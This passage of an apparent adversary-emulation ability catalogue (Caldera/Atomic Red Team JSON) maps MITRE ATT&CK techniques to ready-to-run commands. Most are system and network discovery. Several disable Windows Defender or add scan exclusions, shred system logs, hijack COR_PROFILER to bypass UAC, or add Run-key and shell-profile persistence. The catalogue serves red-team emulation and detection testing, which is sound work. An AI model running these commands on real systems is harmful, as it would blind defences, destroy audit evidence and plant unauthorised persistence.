products/versions.\nhttps://nwgat.ninja/getting-system-information-with-wmic-on-windows/\nElements of this test were observed in the wild used by Aurora Stealer in late 2022 and early 2023, as highlighted in public reporting:\nhttps://blog.sekoia.io/aurora-a-rising-stealer-flying-under-the-radar\nhttps://blog.cyble.com/2023/01/18/aurora-a-stealer-using-shapeshifting-tactics/\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "wmic cpu get name && wmic MEMPHYSICAL get MaxCapacity && wmic baseboard get product && wmic baseboard get version && wmic bios get SMBIOSBIOSVersion && wmic path win32_VideoController get name && wmic path win32_VideoController get DriverVersion && wmic path win32_VideoController get VideoModeDescription && wmic OS get Caption,OSArchitecture,Version && wmic DISKDRIVE get Caption", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "System Information Discovery", "ability_id": "3ca47fba752a36e5492a747e16dd2311", "technique_id": "T1082", "tactic": "discovery", "requirements": [], "name": "System Information Discovery with WMIC", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Identify network configuration information.\n\nUpon successful execution, sh will spawn multiple commands and output will be via stdout.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "if [ -x \"$(command -v arp)\" ]; then : ; else (which yum && yum -y install net-tools)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y net-tools); fi;  ;  if [ -x \"$(command -v arp)\" ]; then arp -a; else echo \"arp is missing from the machine. skipping...\"; fi; if [ -x \"$(command -v ifconfig)\" ]; then ifconfig; else echo \"ifconfig is missing from the machine. skipping...\"; fi; if [ -x \"$(command -v ip)\" ]; then ip addr; else echo \"ip is missing from the machine. skipping...\"; fi; if [ -x \"$(command -v netstat)\" ]; then netstat -ant | awk '{print $NF}' | grep -v '[a-z]' | sort | uniq -c; else echo \"netstat is missing from the machine. skipping...\"; fi;", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "if [ -x \"$(command -v arp)\" ]; then : ; else (which yum && yum -y install net-tools)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y net-tools); fi;  ;  if [ -x \"$(command -v arp)\" ]; then arp -a; else echo \"arp is missing from the machine. skipping...\"; fi; if [ -x \"$(command -v ifconfig)\" ]; then ifconfig; else echo \"ifconfig is missing from the machine. skipping...\"; fi; if [ -x \"$(command -v ip)\" ]; then ip addr; else echo \"ip is missing from the machine. skipping...\"; fi; if [ -x \"$(command -v netstat)\" ]; then netstat -ant | awk '{print $NF}' | grep -v '[a-z]' | sort | uniq -c; else echo \"netstat is missing from the machine. skipping...\"; fi;", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "System Network Configuration Discovery", "ability_id": "334d0a8f48017677533913505003a8fc", "technique_id": "T1016", "tactic": "discovery", "requirements": [], "name": "System Network Configuration Discovery", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Identify network configuration information as seen by Trickbot and described here https://www.sneakymonkey.net/2019/10/29/trickbot-analysis-part-ii/\n\nUpon successful execution, cmd.exe will spawn `ipconfig /all`, `net config workstation`, `net view /all /domain`, `nltest /domain_trusts`. Output will be via stdout.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "ipconfig /all && net config workstation && net view /all /domain && nltest /domain_trusts", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "System Network Configuration Discovery", "ability_id": "9b5a0a6644a9cccc3dc3aa8be490430e", "technique_id": "T1016", "tactic": "discovery", "requirements": [], "name": "System Network Configuration Discovery (TrickBot Style)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Identify network configuration information\n\nUpon successful execution, cmd.exe will spawn multiple commands to list network configuration settings. Output will be via stdout.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "ipconfig /all && netsh interface show interface && arp -a && nbtstat -n && net config", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "System Network Configuration Discovery", "ability_id": "7d8ee68f0e9731db82964f558f614608", "technique_id": "T1016", "tactic": "discovery", "requirements": [], "name": "System Network Configuration Discovery on Windows", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Get a listing of network connections.\n\nUpon successful execution, cmd.exe will execute `netstat`, `net use` and `net sessions`. Results will output via stdout.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "netstat && net use && net sessions", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "System Network Connections Discovery", "ability_id": "a14392d713dffba6a397682ff83259a0", "technique_id": "T1049", "tactic": "discovery", "requirements": [], "name": "System Network Connections Discovery", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Get a listing of network connections.\n\nUpon successful execution, sh will execute `netstat` and `who -a`. Results will output via stdout.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "netstat; who -a", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "netstat; who -a", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "System Network Connections Discovery", "ability_id": "c668e2597e8c0ebf1709f85d253995ab", "technique_id": "T1049", "tactic": "discovery", "requirements": [], "name": "System Network Connections Discovery Linux & MacOS", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Get a listing of network connections.\n\nUpon successful execution, powershell.exe will execute `get-NetTCPConnection`. Results will output via stdout.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Get-NetTCPConnection", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "System Network Connections Discovery", "ability_id": "8ed60dceb98746f1da6214f4f6af7164", "technique_id": "T1049", "tactic": "discovery", "requirements": [], "name": "System Network Connections Discovery with PowerShell", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Identify System owner or users on an endpoint.\n\nUpon successful execution, cmd.exe will spawn multiple commands against a target host to identify usernames. Output will be via stdout. \nAdditionally, two files will be written to disk - computers.txt and usernames.txt.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "cmd.exe /C whoami && wmic useraccount get /ALL && quser /SERVER:\"#{computer_name}\" && quser && qwinsta.exe /server:#{computer_name} && qwinsta.exe && for /F \"tokens=1,2\" %i in ('qwinsta /server:#{computer_name} ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > computers.txt && @FOR /F %n in (computers.txt) DO @FOR /F \"tokens=1,2\" %i in ('qwinsta /server:%n ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > usernames.txt", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "System Owner/User Discovery", "ability_id": "942316dc6a362e44b248a872e5f42c92", "technique_id": "T1033", "tactic": "discovery", "requirements": [], "name": "System Owner/User Discovery", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Identify System owner or users on an endpoint\n\nUpon successful execution, sh will stdout list of usernames.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "users; w; who", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "users; w; who", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "System Owner/User Discovery", "ability_id": "4370001012f5f0df001269627b4737e9", "technique_id": "T1033", "tactic": "discovery", "requirements": [], "name": "System Owner/User Discovery", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Creates system scope environment variables to enable a .NET profiler (COR_PROFILER). System scope environment variables require a restart to take effect.\nThe unmanaged profiler DLL (T1574.012x64.dll`) executes when the CLR is loaded by any process. Additionally, the profiling DLL will inherit the integrity\nlevel of Event Viewer bypassing UAC and executing `notepad.exe` with high integrity. If the account used is not a local administrator the profiler DLL will\nstill execute each time the CLR is loaded by a process, however, the notepad process will not execute with high integrity.\n\nReference: https://redcanary.com/blog/cor_profiler-for-persistence/\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["83f016_T1574.012x64.dll"], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_ENABLE_PROFILING\" -Force -ErrorAction Ignore | Out-Null; Remove-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER\" -Force -ErrorAction Ignore | Out-Null; Remove-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER_PATH\" -Force -ErrorAction Ignore | Out-Null"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Write-Host \"Creating system environment variables\" -ForegroundColor Cyan; New-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_ENABLE_PROFILING\" -PropertyType String -Value \"1\" -Force | Out-Null; New-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER\" -PropertyType String -Value \"{09108e71-974c-4010-89cb-acf471ae9e2c}\" -Force | Out-Null; New-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name \"COR_PROFILER_PATH\" -PropertyType String -Value 83f016_T1574.012x64.dll -Force | Out-Null", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Hijack Execution Flow: COR_PROFILER", "ability_id": "e41543eff9eebdbceef4ee8229cabf98", "technique_id": "T1574.012", "tactic": "multiple", "requirements": [], "name": "System Scope COR_PROFILER", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Identify system services.\n\nUpon successful execution, cmd.exe will execute service commands with expected result to stdout.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "tasklist.exe && sc query && sc query state= all", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "System Service Discovery", "ability_id": "d6bb2a19da7246731ed9c44831b135f8", "technique_id": "T1007", "tactic": "discovery", "requirements": [], "name": "System Service Discovery", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Enumerates started system services using net.exe and writes them to a file. This technique has been used by multiple threat actors.\n\nUpon successful execution, net.exe will run from cmd.exe that queries services. Expected output is to a txt file in in the temp directory called service-list.txt.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["del /f /q /s %temp%\\service-list.txt >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "net.exe start >> %temp%\\service-list.txt", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "System Service Discovery", "ability_id": "a088eb8a2130689fa774ec2653f79db1", "technique_id": "T1007", "tactic": "discovery", "requirements": [], "name": "System Service Discovery - net.exe", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Enumerates system service using systemctl\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "systemctl --type=service", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "System Service Discovery", "ability_id": "4f4b640f1cc25b1ecc03690327517411", "technique_id": "T1007", "tactic": "discovery", "requirements": [], "name": "System Service Discovery - systemctl", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Identify the system time. Upon execution, the local computer system time and timezone will be displayed.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "net time \\\\localhost && w32tm /tz", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "System Time Discovery", "ability_id": "01a25d2158c216cd645bbadf09015abf", "technique_id": "T1124", "tactic": "discovery", "requirements": [], "name": "System Time Discovery", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Identify the system time via PowerShell. Upon execution, the system time will be displayed.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Get-Date", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "System Time Discovery", "ability_id": "6913e132cdd2d9c29294490c2fbef2eb", "technique_id": "T1124", "tactic": "discovery", "requirements": [], "name": "System Time Discovery - PowerShell", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "identifies DCRat delay time tactics using w32tm.\nhttps://research.splunk.com/endpoint/b2cc69e7-11ba-42dc-a269-59c069a48870/\nhttps://blogs.blackberry.com/en/2022/05/dirty-deeds-done-dirt-cheap-russian-rat-offers-backdoor-bargains\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "W32tm /stripchart /computer:localhost /period:5 /dataonly /samples:2", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "System Time Discovery", "ability_id": "d2b459d6fa4aa8fa31e745e1b3d737c3", "technique_id": "T1124", "tactic": "discovery", "requirements": [], "name": "System Time Discovery W32tm as a Delay", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Identify system time. Upon execution, the local computer system time and timezone will be displayed. \n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "date", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "System Time Discovery", "ability_id": "eaf91088bebfec0863a94bbee470f9f2", "technique_id": "T1124", "tactic": "discovery", "requirements": [], "name": "System Time Discovery in macOS", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Displays the current system time via the Windows builtin time command: https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/time\nRecently observed in use in the wild during an incident involving Ursnif malware:\nhttps://github.com/The-DFIR-Report/Sigma-Rules/blob/dc72f0b557fc63347379be0a33439788256761c8/rules/windows/process_creation/proc_creation_win_system_time_lookup.yml\nhttps://thedfirreport.com/2023/01/09/unwrapping-ursnifs-gifts/\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "time", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "System Time Discovery", "ability_id": "f3e078e1df8bd7b934236b5d82f012de", "technique_id": "T1124", "tactic": "discovery", "requirements": [], "name": "System Time with Windows time Command", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test finds and deletes the system log files within /var/log/ directory using various executions(rm, shred, unlink)\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "sudo find /var/log -name 'system.log.*' -exec rm {} \\; sudo find /var/log/ -name \"system.log.*\" -exec shred -u -z -n 3 {} \\; sudo find /var/log/ -name \"system.log.*\" -exec unlink {} \\", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Indicator Removal on Host: Clear Linux or Mac System Logs", "ability_id": "7736f529851c0c391f598cdeddb5d787", "technique_id": "T1070.002", "tactic": "defense-evasion", "requirements": [], "name": "System log file deletion via find utility", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Identify system processes", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Get-Process", "language": null, "name": "psh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "tasklist", "language": null, "name": "cmd", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": "using System;\nusing System.Diagnostics;\nusing System.ComponentModel;\n\nnamespace ProcessDump\n{\n    class MyProcess\n    {\n        void GrabAllProcesses()\n        {\n            Process[] allProc = Process.GetProcesses();\n            foreach(Process proc in allProc){\n                Console.WriteLine(\"Process: {0} -> PID: {1}\", proc.ProcessName, proc.Id);\n            }\n        }\n        static void Main(string[] args)\n        {\n            MyProcess myProc = new MyProcess();\n            myProc.GrabAllProcesses();\n        }\n    }\n}", "timeout": 60, "build_target": "ProcessDump.donut", "platform": "windows", "command": null, "language": "csharp", "name": "donut_amd64", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "ps aux", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.wifipref", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "scan.info"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "ps aux", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Process Discovery", "ability_id": "5a39d7ed-45c9-4a79-b581-e5fb99e24f65", "technique_id": "T1057", "tactic": "discovery", "requirements": [{"relationship_match": [{"source": "fw.disabled"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}, {"relationship_match": [{"source": "no.logs"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "name": "System processes", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "An adversary may wish to establish persistence by adding commands into any of the script files in the /etc/profile.d/ directory, which are executed every time \"any\" user logs in.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["sed -i \"s/# Atomic Red Team was here... T1546.004//\" /etc/profile.d/bash_completion.sh"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "echo '# Atomic Red Team was here... T1546.004' >> /etc/profile.d/bash_completion.sh", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Event Triggered Execution: .bash_profile and .bashrc", "ability_id": "0739c2e7c60bf7703b36a4f8f3480ccc", "technique_id": "T1546.004", "tactic": "multiple", "requirements": [], "name": "System shell profile scripts", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This Atomic will create a registry key called socks5_powershell for persistance access\nhttps://medium.com/walmartglobaltech/systembc-powershell-version-68c9aad0f85c\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-ItemProperty -Path HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -Name \"socks5_powershell\" -Force -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$RunKey = \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"; Set-ItemProperty -Path $RunKey -Name \"socks5_powershell\" -Value \"powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder", "ability_id": "9b74d10b3164f13d357830d1a6ee334a", "technique_id": "T1547.001", "tactic": "multiple", "requirements": [], "name": "SystemBC Malware-as-a-Service Registry", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Print  the last 10 lines of the Uncomplicated Firewall (UFW) log file \n/var/log/ufw.log.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "tail /var/log/ufw.log", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify System Firewall", "ability_id": "57c937f19b6539e983cb807ad74e9cd8", "technique_id": "T1562.004", "tactic": "defense-evasion", "requirements": [], "name": "Tail the UFW firewall log file", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Modifies the filesystem permissions of the specified file or folder to take ownership of the object. Upon execution, \"SUCCESS\" will\nbe displayed for the folder and each file inside of it.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "takeown.exe /f %temp%\\T1222.001_takeown_folder /r", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "File and Directory Permissions Modification: Windows File and Directory Permissions Modification", "ability_id": "2cef8bdaa82b0487e8e8456867a9decf", "technique_id": "T1222.001", "tactic": "defense-evasion", "requirements": [], "name": "Take ownership using takeown utility", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Tamper Win Defender Protection. RedLine Stealer is executing another component file to modify this win defender feature in registry. \nTake note that this modification might not be enough to disable this feature but can be a good indicator of malicious process that \ntries to tamper this Win Defender feature settings.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" /v \"TamperProtection\" /t REG_DWORD /d 5"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" /v \"TamperProtection\" /t REG_DWORD /d 0", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Modify Registry", "ability_id": "faa0f322531905d388c33f66d6c6a286", "technique_id": "T1112", "tactic": "defense-evasion", "requirements": [], "name": "Tamper Win Defender Protection", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Attempting to disable scheduled scanning and other parts of windows defender atp. Upon execution Virus and Threat Protection will show as disabled\nin Windows settings.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Set-MpPreference -DisableRealtimeMonitoring 0; Set-MpPreference -DisableBehaviorMonitoring 0; Set-MpPreference -DisableScriptScanning 0; Set-MpPreference -DisableBlockAtFirstSeen 0"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Set-MpPreference -DisableRealtimeMonitoring 1; Set-MpPreference -DisableBehaviorMonitoring 1; Set-MpPreference -DisableScriptScanning 1; Set-MpPreference -DisableBlockAtFirstSeen 1", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify Tools", "ability_id": "f0fde90a3d59061b226197974e7dcbaa", "technique_id": "T1562.001", "tactic": "defense-evasion", "requirements": [], "name": "Tamper with Windows Defender ATP PowerShell", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Attempting to disable scheduled scanning and other parts of Windows Defender ATP using set-MpPreference aliases. Upon execution Virus and Threat Protection will show as disabled\nin Windows settings.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Set-MpPreference -drtm 0; Set-MpPreference -dbm 0; Set-MpPreference -dscrptsc 0; Set-MpPreference -dbaf 0"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Set-MpPreference -drtm $True; Set-MpPreference -dbm $True; Set-MpPreference -dscrptsc $True; Set-MpPreference -dbaf $True", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify Tools", "ability_id": "32047c4f30d4e65ebc9b22b9b8368bca", "technique_id": "T1562.001", "tactic": "defense-evasion", "requirements": [], "name": "Tamper with Windows Defender ATP using Aliases - PowerShell", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Attempting to disable scheduled scanning and other parts of windows defender atp. These commands must be run as System, so they still fail as administrator.\nHowever, adversaries do attempt to perform this action so monitoring for these command lines can help alert to other bad things going on. Upon execution, \"Access Denied\"\nwill be displayed twice and the WinDefend service status will be displayed.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["sc start WinDefend >nul 2>&1 && sc config WinDefend start=enabled >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "sc stop WinDefend && sc config WinDefend start=disabled && sc query WinDefend", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify Tools", "ability_id": "29b7a018dce0877b3d2292286a0f512f", "technique_id": "T1562.001", "tactic": "defense-evasion", "requirements": [], "name": "Tamper with Windows Defender Command Prompt", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Malware can exclude specific extensions from being scanned and evading detection. \nUpon successful execution, the extension(s) should be on the list of excluded extensions.\nTo check the exclusion list using poweshell  (Get-MpPreference).ExclusionExtension.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["$excludedExts= \".exe\"; Remove-MpPreference -ExclusionExtension  $excludedExts -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$excludedExts= \".exe\"; Add-MpPreference -ExclusionExtension  $excludedExts", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify Tools", "ability_id": "e0946bc3b8b888d6c4cdf3f023fe3c0b", "technique_id": "T1562.001", "tactic": "defense-evasion", "requirements": [], "name": "Tamper with Windows Defender Evade Scanning -Extension", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Malware can exclude a specific path from being scanned and evading detection. \nUpon successul execution, the file provided should be on the list of excluded path. \nTo check the exclusion list using poweshell (Get-MpPreference).ExclusionPath \n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["$excludedpath= \"C:\\Temp\"; Remove-MpPreference -ExclusionPath $excludedpath"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$excludedpath= \"C:\\Temp\"; 